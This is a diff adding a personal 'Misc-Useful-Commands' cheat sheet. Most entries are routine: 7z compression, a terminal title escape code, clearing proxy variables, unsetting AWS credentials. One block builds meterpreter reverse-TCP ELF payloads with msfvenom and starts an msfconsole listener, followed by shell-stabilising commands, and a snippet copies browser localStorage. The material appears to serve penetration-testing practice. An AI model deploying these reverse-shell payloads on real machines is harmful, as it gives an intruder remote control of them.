@@ -1,0 +1,69 @@
+---
+creation_epoch: 1761833175
+lastmod_epoch: 1761833175
+categories: ['Tech Tricks']
+title: Misc-Useful-Commands
+---
+
+<pre>
+7z a  -mx=9 -myx=9 -ms=on -mhc=on -m0=LZMA2 -mmt=on -mtc=on -t7z     
+MYFILE.7z STUFFTOCOMPRESS
+</pre>
+
+<hr />
+
+<pre>
+echo -ne "\033]0;INSERTTERMTABTITLEHERE\007"
+</pre>
+
+<hr />
+
+<pre>
+# STAGELESS
+
+# x86
+
+msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=`curl https://checkip.amazonaws.com` LPORT=4444 -f elf > shell.elf
+
+msfconsole --execute-command 'use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'
+
+
+
+# x64
+
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=`curl https://checkip.amazonaws.com` LPORT=4444 -f elf > shell.elf
+
+msfconsole --execute-command 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'
+
+# ~~~~~~~~~~~~
+
+/bin/bash -l
+	works around	ttyname failed: Inappropriate ioctl for device
+	
+	even with bash -p  did not work (-p is good for suid runs)
+	
+	
+	
+script /dev/null -c bash
+</pre>
+
+<hr />
+
+<pre>
+copy('var data = '+JSON.stringify(localStorage)+';
+
+
+Object.keys(data).forEach(function (k){localStorage.setItem(k, data[k]);});');
+</pre>
+
+<hr />
+
+<pre>
+https_proxy= NO_PROXY= HTTPS_PROXY= HTTP_PROXY= http_proxy= ALL_PROXY= all_proxy= AWS_CA_BUNDLE=     
+</pre>
+
+<hr />
+
+<pre>
+unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+</pre>
